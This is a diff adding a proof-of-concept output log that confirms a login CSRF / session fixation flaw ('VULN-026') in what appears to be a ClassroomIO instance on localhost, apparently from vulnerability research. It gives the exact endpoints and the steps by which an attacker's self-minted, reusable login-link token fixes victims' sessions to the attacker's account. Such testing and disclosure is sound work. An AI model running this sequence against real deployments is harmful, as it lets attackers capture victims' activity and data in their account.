@@ -1,0 +1,15 @@
+========================================================================
+VULN-026: Login CSRF / session fixation via reusable self-mintable login-link GET
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] attacker account: id=40068e04-e0a5-4369-b35a-36440078e5dd email=u_7f93009b@cvehunt.local
+[STEP] attacker self-minted a login-link token via POST /account/view-as-student-token (len=245)
+[STEP] victim #1 (fresh cookie jar, no Origin) navigates to GET /api/auth/login-link?token=<attacker>
+[INFO]   → HTTP 302  Set-Cookie has session=True  get-session user id=40068e04-e0a5-4369-b35a-36440078e5dd email=u_7f93009b@cvehunt.local
+[STEP] victim #2 (another fresh jar, attacker Origin) replays the SAME token
+[INFO]   → HTTP 302  get-session user id=40068e04-e0a5-4369-b35a-36440078e5dd email=u_7f93009b@cvehunt.local
+[PROOF] login-link GET returned Set-Cookie: classroomio.session_token with NO CSRF/Origin check
+[PROOF] victim #1 session resolves to the ATTACKER account (id=40068e04-e0a5-4369-b35a-36440078e5dd) → session fixation / login CSRF
+[PROOF] victim #2 (separate jar, attacker Origin) also fixed to the attacker account → token is REUSABLE
+==> VULN-026: CONFIRMED — cross-site login-link GET fixes a victim into the attacker's account; token reusable
+[OK] confirmed login CSRF / session fixation via reusable self-mintable login-link GET
